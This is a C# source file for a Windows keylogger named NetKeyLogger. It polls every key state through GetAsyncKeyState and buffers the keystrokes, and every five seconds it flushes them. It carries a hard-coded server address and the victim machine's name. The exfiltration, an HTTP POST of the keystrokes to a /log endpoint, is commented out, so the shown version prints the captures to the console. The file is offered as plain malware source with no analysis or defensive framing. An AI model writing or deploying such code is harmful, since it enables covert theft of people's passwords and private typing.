using System.Runtime.InteropServices;

namespace NetKeyLogger
{
    internal class Program
    {

        static private Uri url;
        static private string machineName;
        static private KeyValuePair<string, string> machineNameFormData;
        static private HttpClient server = new HttpClient();
        static private string str;

        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        static void Main(string[] args)
        {
            url = new Uri("http://10.11.97.215:5000");

            //url = new Uri( args[0]);

            machineName = System.Environment.MachineName;

            machineNameFormData = new KeyValuePair<string, string>("name", machineName);


            KeyLogger();
        }

        static void KeyLogger()
        {
            str = "";
            Dictionary<int, string> myDictionary = new Dictionary<int, string>
        {
            { 1, "" },
            { 2, "" },
            { 8, "" },
            { 9, "[TAB]" },
            { 13, "[ENTER]" },
            { 16, "[SHIFT]" },
            { 17, "" },
            { 19, "[PAUSE]" },
            { 20, "[CAPS LOCK]" },
            { 27, "[ESC]" },
            { 32, " " },
            { 33, "[PAGE UP]" },
            { 34, "[Page Down]" },
            { 35, "[End]" },
            { 36, "[Home]" },
            { 37, "[Left]" },
            { 38, "[Up]" },
            { 39, "[Right]" },
            { 40, "[Down]" },
            { 44, "[Print Screen]" },
            { 45, "[Insert]" },
            { 46, "[Delete]" },
            { 48, "0" },
            { 49, "1" },
            { 50, "2" },
            { 51, "3" },
            { 52, "4" },
            { 53, "5" },
            { 54, "6" },
            { 55, "7" },
            { 56, "8" },
            { 57, "9" },
            { 65, "a" },
            { 66, "b" },
            { 67, "c" },
            { 68, "d" },
            { 69, "e" },
            { 70, "f" },
            { 71, "g" },
            { 72, "h" },
            { 73, "i" },
            { 74, "j" },
            { 75, "k" },
            { 76, "l" },
            { 77, "m" },
            { 78, "n" },
            { 79, "o" },
            { 80, "p" },
            { 81, "q" },
            { 82, "r" },
            { 83, "s" },
            { 84, "t" },
            { 85, "u" },
            { 86, "v" },
            { 87, "w" },
            { 88, "x" },
            { 89, "y" },
            { 90, "z" },
            { 91, "[Windows]" },
            { 92, "[Windows]" },
            { 93, "[List]" },
            { 96, "0" },
            { 97, "1" },
            { 98, "2" },
            { 99, "3" },
            { 100, "4" },
            { 101, "5" },
            { 102, "6" },
            { 103, "7" },
            { 104, "8" },
            { 105, "9" },
            { 106, "*" },
            { 107, "+" },
            { 109, "-" },
            { 110, "," },
            { 111, "/" },
            { 112, "[F1]" },
            { 113, "[F2]" },
            { 114, "[F3]" },
            { 115, "[F4]" },
            { 116, "[F5]" },
            { 117, "[F6]" },
            { 118, "[F7]" },
            { 119, "[F8]" },
            { 120, "[F9]" },
            { 121, "F[10]" },
            { 122, "F[11]" },
            { 123, "F[12]" },
            { 144, "[Num Lock]" },
            { 145, "[Scroll Lock]" },
            { 160, "" },
            { 162, "[Ctrl]" },
            { 163, "[Ctrl]" },
            { 164, "[Alt]" },
            { 165, "[Alt]" },
            { 188, "," },
            { 189, "-" },
            { 190, "." },
            { 222, "'" },
            { 226, "\\" }
        };
            Timer timer = new Timer(TimerCallback, null, TimeSpan.FromSeconds(5), TimeSpan.FromSeconds(5));
            while (true)
            {
                for (int i = 0; i < 255; i++)
                {
                    if (GetAsyncKeyState(i) == 32769)
                    {
                        str += myDictionary[i];
                    }

                }
            }
        }


        static void WriteOutput(string value)
        {
            //KeyValuePair<string, string> logFormData = new KeyValuePair<string, string>("key", value);

            //string requestResult = server.PostAsync(url + "/log", new FormUrlEncodedContent(new List<KeyValuePair<string, string>> {
            //    machineNameFormData,
            //    logFormData
            // })).Result.Content.ReadAsStringAsync().Result;

            //System.Console.WriteLine(requestResult);
            str = "";
            Console.Write(value);

        }

        static void TimerCallback(object state)
        {
            WriteOutput(str);
        }

    }

}
